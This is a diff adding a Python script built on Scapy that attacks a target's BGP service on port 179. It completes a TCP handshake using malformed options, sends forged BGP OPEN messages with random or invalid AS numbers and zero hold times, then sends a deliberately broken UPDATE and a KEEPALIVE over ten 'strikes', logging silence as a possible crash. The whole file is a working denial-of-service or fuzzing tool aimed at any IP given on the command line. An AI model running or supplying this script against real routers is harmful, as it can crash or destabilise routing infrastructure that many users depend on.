@@ -1,0 +1,79 @@
+
+from scapy.all import *
+from scapy.contrib.bgp import *
+import random
+import logging
+import time
+
+logging.basicConfig(filename='3span.log', level=logging.INFO, format='%(asctime)s - %(message)s')
+
+def forge_tcp_options():
+    return [
+        ('MSS', 1460),
+        ('WScale', 15),
+        ('Timestamp', (random.randint(100000, 999999), 0)),
+        ('NOP', None),
+        ('NOP', None),
+        ('SAckOK', b''),
+        ('MSS', 1400),  # Duplicate to confuse parsers
+        ('EOL', None)
+    ]
+
+def send_codex_trinity_assault(dst_ip, dst_port=179):
+    for i in range(10):  # 10 strikes
+        print(f"[🌀] Launching tests {i + 1}/10")
+        router_id = ".".join(str(random.randint(1, 254)) for _ in range(4))
+        my_as = random.choice([64512, 65000, 65535, 0])
+        hold_time = random.choice([0, 90, 255])
+        src_port = RandShort()
+
+        # Poisoned SYN
+        ip = IP(dst=dst_ip)
+        syn = TCP(sport=src_port, dport=dst_port, flags='S', seq=1000, options=forge_tcp_options())
+        syn_ack = sr1(ip/syn, timeout=3, verbose=0)
+
+        if not syn_ack or not syn_ack.haslayer(TCP) or syn_ack[TCP].flags != 'SA':
+            print(f"[!] No SYN-ACK (strike {i + 1})")
+            logging.info(f"[{i}] No SYN-ACK.")
+            continue
+
+        # ACK to complete handshake
+        ack = TCP(sport=src_port, dport=dst_port, flags='A', seq=syn_ack.ack, ack=syn_ack.seq + 1)
+        send(ip/ack, verbose=0)
+
+        # BGP OPEN packet with forged session
+        open_pkt = BGPHeader(type=1)/BGPOpen(
+            version=4,
+            my_as=my_as,
+            hold_time=hold_time,
+            bgp_id=router_id,
+            opt_param_len=0
+        )
+        send(ip/TCP(sport=src_port, dport=dst_port, flags='PA', seq=ack.seq, ack=ack.ack)/open_pkt, verbose=0)
+        logging.info(f"[{i}] Sent BGP OPEN: ASN={my_as}, ID={router_id}, Hold={hold_time}")
+
+        time.sleep(0.3)
+
+        # BGP UPDATE + KEEPALIVE (simulate mid-negotiation desync)
+        update_pkt = BGPHeader(type=2)/Raw(load=b'\x00\x00')  # Broken UPDATE
+        keepalive_pkt = BGPHeader(type=4)
+        send(ip/TCP(sport=src_port, dport=dst_port, flags='PA', seq=ack.seq+len(open_pkt), ack=ack.ack)/update_pkt, verbose=0)
+        send(ip/TCP(sport=src_port, dport=dst_port, flags='PA', seq=ack.seq+len(open_pkt)+len(update_pkt), ack=ack.ack)/keepalive_pkt, verbose=0)
+        logging.info(f"[{i}] Sent desync: malformed UPDATE and KEEPALIVE after OPEN")
+
+        response = sr1(ip/TCP(sport=src_port, dport=dst_port, flags='PA', seq=ack.seq+100, ack=ack.ack)/Raw(load=b'\x00'), timeout=3, verbose=0)
+        if response:
+            print(f"[+] Response: {response.summary()}")
+            logging.info(f"[{i}] Response: {response.summary()}")
+        else:
+            print(f"[!] No response — potential crash or corruption (strike {i + 1})")
+            logging.info(f"[{i}] No response.")
+
+        time.sleep(1.25)
+
+if __name__ == "__main__":
+    import sys
+    if len(sys.argv) != 2:
+        print("Usage: sudo python3 test.py <target_ip>")
+        sys.exit(1)
+    send_codex_trinity_assault(sys.argv[1])
